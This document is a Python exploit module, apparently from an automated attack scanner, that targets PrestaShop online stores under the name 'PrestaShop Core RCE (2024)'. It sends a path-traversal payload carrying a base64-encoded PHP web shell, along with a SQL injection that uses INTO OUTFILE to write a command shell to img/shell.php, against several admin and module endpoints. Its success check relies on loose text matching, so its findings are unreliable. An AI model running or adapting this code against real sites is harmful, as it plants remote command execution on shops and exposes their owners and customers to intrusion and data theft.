import requests
from core.printmodels import *
import base64

class PrestaShop_Core_RCE:
    def __init__(self):
        self.name = "PrestaShop Core RCE"
        self.description = "PrestaShop Core Remote Code Execution (2024)"
        self.author = "mrphoenix"

    def Exploit(self, site):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest'
            }

            php_payload = '<?php system($_GET["cmd"]); ?>'
            encoded_payload = base64.b64encode(php_payload.encode()).decode()

            payloads = [
                {
                    "controller": "AdminModules",
                    "action": "install",
                    "module_name": f"../../../config/config.inc.php\x00{encoded_payload}"
                },
                {
                    "ajax": "1",
                    "action": "productUpdate",
                    "id_product": "1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,'<?php system($_GET[\"cmd\"]); ?>',NULL INTO OUTFILE '../img/shell.php'-- -"
                }
            ]

            endpoints = [
                f"{site}/admin123/index.php",
                f"{site}/modules/ps_imageslider/ajax_ps_imageslider.php",
                f"{site}/admin/index.php?controller=AdminProducts"
            ]

            for endpoint in endpoints:
                for payload in payloads:
                    response = requests.post(endpoint, headers=headers, data=payload, verify=False, timeout=10)
                    if response.status_code in [200, 302] and ('success' in response.text or 'prestashop' in response.text.lower()):
                        return PrintSuccess(f"[PrestaShop-2024] Vulnerable! RCE successful at {endpoint}")

            return PrintFailed("[PrestaShop-2024] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[PrestaShop-2024] Error: {str(e)}")
